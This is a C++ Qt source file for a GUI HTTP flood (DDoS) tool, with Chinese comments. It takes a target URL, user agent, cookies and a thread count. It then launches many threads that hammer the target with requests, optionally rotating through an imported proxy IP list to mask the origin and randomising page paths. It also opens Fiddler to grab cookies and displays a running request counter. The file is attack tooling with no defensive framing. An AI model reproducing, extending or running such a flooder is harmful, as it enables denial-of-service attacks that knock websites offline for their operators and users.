#include "QtHttpDdos.h"
#include "ui_QtHttpDdos.h"
#include "qtwebview.h"

#include <QMessageBox>
#include <QFileDialog>

#include <QApplication>
#include <QMessageBox>
#include <QProgressBar>
#include <QLineEdit>
#include <QLabel>
#include <QStatusBar>
#include <QMainWindow>
#include <QDesktopWidget>
#include <QAbstractEventDispatcher>
#include <QSignalMapper>
#include <QVariant>
#include <QSettings>
#include <QProcess>

#ifdef Q_OS_WIN
#pragma comment(lib, "user32.lib")
#include <qt_windows.h>
#endif

const ULONG_PTR CUSTOM_TYPE = 10000;
QtHttpDdos::QtHttpDdos(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::QtHttpDdos)
{

    m_pIsProxyIp = false;
    m_pRandPage = false;
    m_pFlushRequestCountTimer = new QTimer();
    m_pIsNewThread = true;
    connect(m_pFlushRequestCountTimer,SIGNAL(timeout()),this,
            SLOT(slot_flushRequestCount()));

    ui->setupUi(this);

}

QtHttpDdos::~QtHttpDdos()
{
    delete m_pFlushRequestCountTimer;
    delete ui;
}

void QtHttpDdos::setUserAgent(const QString user_agent)
{
    ui->uaEdt->setText(user_agent);
}

void QtHttpDdos::setCookies(const QString cookies)
{
    ui->cookieEdt->setText(cookies);
}

void QtHttpDdos::closeEvent(QCloseEvent *event)
{
    stopRequest();
}
////进程间通信
//bool QtHttpDdos::nativeEvent(const QByteArray &eventType, void *message, long *result)
//{
//    MSG *param = static_cast<MSG *>(message);

//        switch (param->message)
//        {
//        case WM_COPYDATA:
//        {
//            COPYDATASTRUCT *cds = reinterpret_cast<COPYDATASTRUCT*>(param->lParam);
//            if (cds->dwData == CUSTOM_TYPE)
//            {
//                QString strMessage = QString::fromUtf8(reinterpret_cast<char*>(cds->lpData), cds->cbData);
//                QMessageBox::information(this, QStringLiteral("提示"), strMessage);
//                *result = 1;
//                startRequest();
//                return true;
//            }
//        }
//        }
//        return QWidget::nativeEvent(eventType, message, result);
//}

void QtHttpDdos::startRequest()
{
    m_pFlushRequestCountTimer->start(100);
    QString url = ui->urlEdt->text();
    QString ua = ui->uaEdt->toPlainText();
    QString cookie = ui->cookieEdt->toPlainText();
    int count = ui->runCountEdt->text().toInt();
    //    this->thread()->setPriority(QThread::HighestPriority);
    //第一次点击开始，新建线程
    if(m_pIsNewThread){
        for(int i = 0;i < count; i++){
            QThread *thread = new QThread;

            m_pThreadList.enqueue(thread);

            QHttpThread *http_request = new QHttpThread(url,count,ua,cookie);
            if(m_pIsProxyIp){
                http_request->switchProxyIp(m_pIsProxyIp);
                for(int j = 0; j < m_pProxyIpList.length(); j++){
                    http_request->addProxyIp(m_pProxyIpList.at(j));
                    http_request->addProxyPort(m_pProxyPortList.at(j));
                }
            }
            m_pHttpList.enqueue(http_request);
            http_request->moveToThread(thread);
        }
        startThread();
    }else{
        //开启暂停的线程
        for(int i = 0; i < m_pHttpList.length(); i++){
            if(m_pIsProxyIp){
                m_pHttpList[i]->switchProxyIp(true);
            }else{
                m_pHttpList[i]->switchProxyIp(false);
            }
            m_pHttpList[i]->startThread();
        }
    }

}
//停止发起请求
void QtHttpDdos::stopRequest()
{
    m_pFlushRequestCountTimer->stop();
    for(int i = 0; i < m_pThreadList.length(); i++){
        m_pHttpList.at(i)->stopThread();
    }
}
//开启线程
void QtHttpDdos::startThread()
{
    if(m_pRandPage){
        int start = ui->pageRangeStart->text().toInt();
        int end = ui->pageRangeEnd->text().toInt();
        for(int i = 0;i < m_pHttpList.length(); i++){
            m_pHttpList.at(i)->setPageRange(start,end);
        }
    }
    for(int i = 0; i < m_pThreadList.length(); i++){
        m_pThreadList.at(i)->start();
        m_pHttpList.at(i)->run();
    }
}
//开始/暂停请求
void QtHttpDdos::on_controllerpbn_clicked()
{
    if(ui->controllerpbn->text() == "start"){
        ui->controllerpbn->setText("stop");
        startRequest();
    }else{
        ui->controllerpbn->setText("start");
        stopRequest();
    }
}
//导入代理ip
void QtHttpDdos::on_importIpbtn_clicked()
{
    QString fileName =
            QFileDialog::getOpenFileName(this, tr("open file"), " ",  tr("全部文件(*.*);;文本文件(*.txt)"));
    qDebug() << fileName;
    QFile file(fileName);
    if (file.open(QFile::ReadOnly | QFile::Text))
    {
        QTextStream toText(&file);
        //设置文件流编码方式
        toText.setCodec("GBK");
        QStringList ip_port;
        QString line;
        while(toText.readLineInto(&line)){
            if(line == "")
                return ;
            ip_port = line.split(":");

            m_pProxyIpList.enqueue(ip_port.at(0));
            m_pProxyPortList.enqueue(ip_port.at(1));
            //            for(int i = 0;i < m_pHttpList.length(); i++){
            //                m_pHttpList.at(i)->addProxyIp(ip_port.at(0));
            //                m_pHttpList.at(i)->addProxyPort(ip_port.at(1));
            //            }
        }
    }
}
//刷新界面访问次数
void QtHttpDdos::slot_flushRequestCount()
{
    int64_t totalCount = 0;
    for(int i = 0; i < m_pHttpList.length(); i++){
        totalCount += m_pHttpList[i]->getRequestCount();
    }

    if(totalCount < 0)
        totalCount = 99999999999999999;
    ui->requestCountLab->setText(QString::number(totalCount));
}


//设置是否启用代理ip
void QtHttpDdos::on_proxyIdRbtn_clicked(bool checked)
{
    qDebug() << checked;
    m_pIsProxyIp = checked;
    for(int i = 0;i < m_pHttpList.length(); i++){
        m_pHttpList.at(i)->switchProxyIp(checked);
    }
}
//打开抓包工具
void QtHttpDdos::on_getCookieBtn_clicked()
{
    QProcess   process(this);
    process.startDetached("Fiddler2/Fiddler.exe");
}
//打开网页
void QtHttpDdos::on_openUrl_clicked()
{
    MainWindow *main = new MainWindow(this);
    QString url = ui->urlEdt->text();
    main->navigate(url);
    main->show();
}

//确定是否使用分页
void QtHttpDdos::on_surePageRange_clicked(bool checked)
{
    m_pRandPage = checked;
}
